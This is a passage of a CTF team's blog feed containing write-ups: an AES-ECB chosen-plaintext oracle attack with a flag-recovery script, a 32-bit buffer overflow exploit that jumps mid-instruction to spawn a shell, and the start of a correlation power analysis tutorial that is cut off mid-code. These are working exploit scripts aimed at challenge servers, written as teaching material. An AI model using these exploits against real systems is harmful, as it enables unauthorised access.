class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">0_______________ 545506ce0fa14673dba3d92a09a28774</span><br><span class="line">1_______________ a26f177d5ef506e40e79411f4a1ef0bf</span><br><span class="line">2_______________ a4a7aee9adba7af7d709662da5c19aee</span><br><span class="line">      ....                   .......</span><br><span class="line">&#125;_______________ 2a5831079c0a0591601f25278f4623f3</span><br></pre></td></tr></table></figure><p>With this we get the last character of the <strong>flag</strong>, now repeat this for the rest of the characters, I’ll give one more example how to get the next character, sending <strong>“AA”</strong> as input:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">AATUCTF&#123;MY_B34UT      1FULL_FL4G_L0L_X      D&#125;______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">6ca95659b3828138ff0408db597a6614 45551fa5b4b751017e717e2e4193cc8d 3c872cee5f361ca44e66a554602ee1c3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now brute force it like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">0&#125;______________ 6ef0fae728efd2738f1a5f179f6980a8</span><br><span class="line">1&#125;______________ 2c851b1a58399ffdc6b1c4ed23287fa7</span><br><span class="line">2&#125;______________ 664fafa0563cc1b84931daf6cf1cbc68</span><br><span class="line">      ....                   .......</span><br><span class="line">D&#125;______________ 3c872cee5f361ca44e66a554602ee1c3</span><br></pre></td></tr></table></figure><p>Repeat this and you’ll get every character of the flag, the python script I implemented for this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">r = remote(<span class="string">'18.218.238.95'</span>, <span class="number">12345</span>)</span><br><span class="line"><span class="comment">#r = process('./redacted.py')</span></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Enter your text here: '</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">''</span>:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">15</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">15</span>-i) + flag+c)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[:<span class="number">32</span>]:</span><br><span class="line">flag += c</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">15</span>-i<span class="number">-1</span>))</span><br><span class="line">encrypted_first = re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">padding_char = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> padding_char == <span class="string">''</span>:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">1</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.printable:</span><br><span class="line">p = <span class="string">'&#125;'</span>+ x*<span class="number">15</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[<span class="number">64</span>:<span class="number">64</span>+<span class="number">32</span>]:</span><br><span class="line">padding_char = x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'&#125;'</span>*<span class="number">1</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag_part2 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">p = c+flag_part2 + (i<span class="number">-1</span>)*padding_char</span><br><span class="line">r.sendline(p)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[<span class="number">64</span>:<span class="number">64</span>+<span class="number">32</span>]:</span><br><span class="line">flag_part2 = c + flag_part2</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">17</span>-i+<span class="number">1</span>))</span><br><span class="line">encrypted_first = re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> flag+flag_part2</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>Running it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">python reeas.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./redacted.py'</span>: pid 11451</span><br><span class="line">Enter your text here: </span><br><span class="line">TUCTF&#123;A3S_3CB_1S&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SBL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SR4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SLN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SULN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SVULN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S_VULN3R4BL3!!!!&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;AESential Lesson&lt;br&gt;465&lt;br&gt;&lt;br&gt;Thought I’d give you an essential lesson to how you shouldn’t get input for AES in ECB mode.&lt;
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
    
      <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
    
      <category term="tuctf2018" scheme="https://teamrocketist.github.io/tags/tuctf2018/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] TUCTF 2018 - Shella Hard</title>
    <link href="https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/"/>
    <id>https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/</id>
    <published>2018-11-26T01:07:48.000Z</published>
    <updated>2018-11-26T01:14:52.585Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Shella Hard<br>475<br><br>Difficulty: mind-melting hard<br>This program is crap! Is there even anything here?<br><br>nc 3.16.169.157 12345<br><br></blockquote><p>We were given a 32 bit binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file shella-hard </span><br><span class="line">shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped</span><br></pre></td></tr></table></figure><p>Checking it’s security we can see we have <strong>NX enabled</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec shella-hard</span><br><span class="line">[*] &apos;/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><p>Now looking at the main function on radare2:<br><img src="https://i.imgur.com/4kHNIuW.png" alt=""></p><p>We can easily see we have a buffer overflow here, the <strong>buf</strong> is located at <strong>ebp-0x10</strong> and we are allowed to read up to 0x30 bytes with the <strong>read</strong> instruction, perhaps we have some limitations, we have a very limited space it only overflows 0x20 bytes from the buffer so we can’t create a very big <strong>rop chain</strong>, the binary is <strong>dynamic linked</strong> and the admins didn’t provide any <strong>libc</strong> file, even when not provided we can still use <img src="libc-database" alt="https://github.com/niklasb/libc-database"> to find it , but we don’t have any way of leaking addresses, because the binary doesn’t use any function that spits the output to the stdout like <strong>printf</strong>, <strong>puts</strong> or even <strong>write</strong>.</p><p>So since we can’t do anything of this the admins probably provided a way of creating a shell within the code, as we can see in radare we have a function named <strong>giveShell</strong>, which uses <strong>execve</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/2i3tBMQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/2i3tBMQ.png" alt=""><br></a></p><p>After calculating the offsets to the return address we get something like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> process(<span class="string">'./shella-hard'</span>, aslr=<span class="keyword">False</span>, env=&#123;&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'3.16.169.157'</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line">debug = <span class="keyword">True</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./shella-hard'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GIVESHELL = <span class="number">0x0804845c</span></span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">  gdb.attach(r, <span class="string">"""b main</span></span><br><span class="line"><span class="string">b *0x08048457</span></span><br><span class="line"><span class="string">b *0x08048467</span></span><br><span class="line"><span class="string">b *0x08048449</span></span><br><span class="line"><span class="string">c"""</span>)</span><br><span class="line">r.send(<span class="string">'A'</span>* <span class="number">20</span> + p32(GIVESHELL))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>But as we can see it looks broken? the address <strong>0x6a006a44</strong> will make us to crash into a <strong>page fault</strong>, as we can see here on gdb if we try to jump immediately into that function:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/KlGtbmw.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KlGtbmw.png" alt=""><br></a></p><p>After loosing some time and trying another things I remembered reading a paper about a cool <strong>ROP</strong> technique to find “hidden” rop gadgets, but what’s a hidden rop gadget? Let’s take an example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8049166: 66 90                 xchg   %ax,%ax</span><br><span class="line">8049168: 80 3c 1f c3           cmpb   $0xc3,(%edi,%ebx,1)</span><br></pre></td></tr></table></figure><p>For example this could be a sample snippet from <strong>objdump</strong>.</p><p>The first column is the address of the instruction.</p><p>The second column is the hexadecimal code (machine code) of the x86 instruction.</p><p>The last column is the assembly instruction itself, in ASCII human readable format, with mnemonic and operands etc.</p><p>You can notice the presence of the value 0xc3 as the last byte of the second instruction.</p><p>This value is really important because it happens to be the machine code for the “ret” instruction.</p><p>So the trick here is to jump into the middle of this instruction:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmpb $0xc3,(%edi,%ebx,1)</span><br></pre></td></tr></table></figure><p>For instance at address <strong>0x8049166a</strong>. The CPU would see the following machine code sequence:<br><code>1f c3</code></p><p>Which will be interpreted as:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.data&gt;:</span><br><span class="line">   0: 1f                    pop    %ds</span><br><span class="line">   1: c3                    ret</span><br></pre></td></tr></table></figure><p>Finding a hidden <strong>rop gadget</strong>, we can use the same idea in the function <strong>givenShell</strong>: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ (fcn) sym.giveShell 26</span><br><span class="line">|   sym.giveShell ();</span><br><span class="line">|           0x08048458      55             push ebp</span><br><span class="line">|           0x08048459      89e5           mov ebp, esp</span><br><span class="line">|           0x0804845b      90             nop</span><br><span class="line">|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1</span><br><span class="line">|           0x08048461      006800         add byte [eax], ch</span><br><span class="line">|           0x08048464      850408         test dword [eax + ecx], eax ; [0x13:4]=-1 ; 19</span><br><span class="line">|           0x08048467      e8b4feffff     call sym.imp.execve</span><br><span class="line">|           0x0804846c      83c40c         add esp, 0xc</span><br><span class="line">|           0x0804846f      90             nop</span><br><span class="line">|           0x08048470      c9             leave</span><br><span class="line">\           0x08048471      c3             ret</span><br><span class="line">[0x08048340]&gt;</span><br></pre></td></tr></table></figure><p>What I did was to jump into the middle of:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1</span><br></pre></td></tr></table></figure></p><p>So lets see what happens what’s the “transformation” in radare if we jump into the middle:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/QVNPHVS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QVNPHVS.png" alt=""><br></a></p><p>This is perfect! we get exactly what we need for spawning a shell! it even reveals there was a global with a “/bin/sh” string that I didn’t even found.</p><p>Now fixing our python script: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python shella-hard.py</span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">[+] Starting local process <span class="string">'./shella-hard'</span>: pid <span class="number">1190</span></span><br><span class="line">[!] ASLR <span class="keyword">is</span> disabled!</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">core  flag  output32  shella-hard  shella-hard.py  wtf.c</span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;test-flag-here&#125;</span><br></pre></td></tr></table></figure><p>No real flag here, unfortunately the admins shut down the challenges right after the challenges so I can only show it working locally and I don’t remember the real flag, anyway it doesn’t really matter.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;Shella Hard&lt;br&gt;475&lt;br&gt;&lt;br&gt;Difficulty: mind-melting hard&lt;br&gt;This program is crap! Is there even anything here?&lt;br&gt;&lt;br&gt;nc 3.16
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x86" scheme="https://teamrocketist.github.io/categories/Pwn/x86/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/Stack-Overflow/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="jump_middle_instruction" scheme="https://teamrocketist.github.io/tags/jump-middle-instruction/"/>
    
      <category term="tuctf2018" scheme="https://teamrocketist.github.io/tags/tuctf2018/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] SquareCtf 2018 - C4: leaky power</title>
    <link href="https://teamrocketist.github.io/2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/"/>
    <id>https://teamrocketist.github.io/2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/</id>
    <published>2018-11-14T16:59:54.000Z</published>
    <updated>2018-11-14T17:22:56.511Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>C4: leaky power<br>222<br><br>C4 is a very advanced AES based defensive system. You are able to monitor the power lines. Is that enough?<br><br>You’re given three files:<br><br>    powertraces.npy: Measurements (over time) of power consumption of a chip while performing AES encryption<br>    #: Corresponding plaintext inputs that were encrypted<br>    instructions.jwe: File encrypted using the same key as plaintexts.npy.<br><br>note: The first two files are NumPy arrays.<br><br>note: there’s a mistake in the way instructions.jwe was created (the algorithm is A128GCM, not A256GCM).<br><br></blockquote><p>The encryption used is <strong>AES</strong>, from reading the challenge description we know we eventually were able to monitor the powerlines having some power traces on <strong>powertraces.npy</strong> and the corresponding plaintexts used on <strong>plaintexts.npy</strong>, the ciphertext we want to decrypt is located at <strong>instructions.jwe</strong>.</p><p>We have some power traces so we will need to use some kind of <strong>side-channel analysis</strong>:</p><p>In <strong>CPA (Correlation power analysis)</strong> the goal is to accurately produce a <strong>power model</strong> of the device under attack. During an attack, the aim is to find <strong><a href="https://en.wikipedia.org/wiki/Correlation_and_dependence" target="_blank" rel="noopener">Correlation</a></strong> between a <strong>predicted output</strong> and <strong>the actual power output</strong> of a device. If the power model is <strong>accurate</strong> then a strong correlation should be demonstrated between the predicted output and actual output. If this correlation is <strong>found</strong> then, gathering a <strong>large</strong> number of traces will enable one to show that the correctly predicted <strong>cipher key</strong> will demonstrate the <strong>highest level of correlation</strong>.</p><p>One power model which may be used is the <strong>Hamming Weight Power Model</strong>. Traditionally, the Hamming weight of a value is the number of <strong>non-zeroes</strong>. For example, in the binary number <strong>1100 0010</strong> the Hamming weight would be <strong>3</strong>. The assumption in using the Hamming Weight Power Model in power analysis attacks is that the <strong>number of bits</strong> set to 0 or 1 of an output is <strong>correlated</strong> with the <strong>power consumption</strong> of a device. The Hamming weight itself is then used as an arbitrary unit to model the consumption of power in a device. <strong>Hamming weight units</strong> can then be compared to the actual voltage levels of power traces captured when a device was performing cryptographic operations. This act of comparison is the process of finding correlation between <strong>the modelled power unit values</strong> and the <strong>actual power consumed</strong>.</p><p>One technique to calculate <strong>correlation</strong> between the <strong>power model</strong> and the <strong>actual power consumption</strong> is to use <strong>Pearson correlation coefficient equation</strong>. In essence, this equation will take two sets data <strong>(X and Y)</strong> and calculate whether there is a linear (positive or negative) <strong>correlation</strong> between the two sets of values. We may use this equation to <strong>find significance in our power traces</strong> since the assumption with the Hamming Weight Power Model is that as the number of 1’s increase in our predicted output, so too does the power consumption increase in the actual output (and vice versa).</p><p><a data-fancybox="gallery" href="https://wikimedia.org/api/rest_v1/media/math/render/svg/60e3f3116e2923c792aafb904dcac308624a1d77" target="_blank" rel="noopener"><br><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/60e3f3116e2923c792aafb904dcac308624a1d77" alt=""><br><em>Figure 1 - Pearson correlation coefficient equation</em><br></a></p><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>At the start of encryption, the plaintext values (the data to be encrypted) and the cipher key values (the key used for encryption and decryption purposes) will be each arranged into a 4×4 matrix in the positions as shown in <strong>Figure 2</strong>. Each value in this matrix holds 1 byte of data. During the <strong>AddRoundKey</strong> step, each plaintext value is XOR’d with a cipher key value at a matching position in the 4×4 matrix.</p><p><a data-fancybox="gallery" href="https://www.tandfonline.com/na101/home/literatum/publisher/tandf/journals/content/tsec20/2017/tsec20.v001.i02/23742917.2016.1231523/20170804/images/medium/tsec_a_1231523_f0003_b.gif" target="_blank" rel="noopener"><br><img src="https://www.tandfonline.com/na101/home/literatum/publisher/tandf/journals/content/tsec20/2017/tsec20.v001.i02/23742917.2016.1231523/20170804/images/medium/tsec_a_1231523_f0003_b.gif" alt=""><br><em>Figure 2. Plaintext and cipher key arrangement.</em><br></a></p><p>After <strong>AddRoundKey</strong>, the <strong>SubBytes</strong> step will use the result produced by <strong>Pi⊕ Ki</strong> as a lookup for a value stored in the <strong>Rijndael S-box</strong>. The <strong>S-box</strong> output will replace <strong>Pi⊕ Ki</strong>. The S-box is a 16×16 matrix of values which remains constant for all AES implementations. Each position in the 16×16 matrix will hold 1 byte of data.<br><a data-fancybox="gallery" href="https://i.imgur.com/TDliwlN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/TDliwlN.png" alt=""><br><em>Figure 3 - Rijndael S-box</em><br></a></p><p>For example if the result of <strong>Pi ⊕ Ki</strong> is <strong>c5</strong> then we look for in the sbox table for the line <strong>c</strong> and the column <strong>5</strong> and we obtain the value <strong>a6</strong>.</p><p>In the context of CPA attack implemented aim to <strong>exploit</strong> the fact that information may be <strong>leaked</strong> if one was to monitor the power consumption of a cryptographic device during the point in which the <strong>S-box lookup</strong> is <strong>carried out</strong>.</p><h1 id="Writing-Python-Script-of-CPA"><a href="#Writing-Python-Script-of-CPA" class="headerlink" title="Writing Python Script of CPA"></a>Writing Python Script of CPA</h1><p>Both this files are <strong>numpy arrays</strong>, they can be loaded into python by using the <strong>numpy.load</strong> function:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">traces = np.load(<span class="string">'powertraces.npy'</span>)</span><br><span class="line">pt = np.load(<span class="string">'plaintexts.npy'</span>)</span><br></pre></td></tr></table></figure><p>Now for each we want to create some <strong>hypothesis</strong>, the range is between <strong>0x0</strong> to <strong>0xff</strong> (all possible bytes), this hypothesis are key guesses in which we will <strong>Xor</strong> them between with the plaintexts used and calculated it’s <strong>Hamming Weight</strong> : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">sbox=(</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line"><span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span 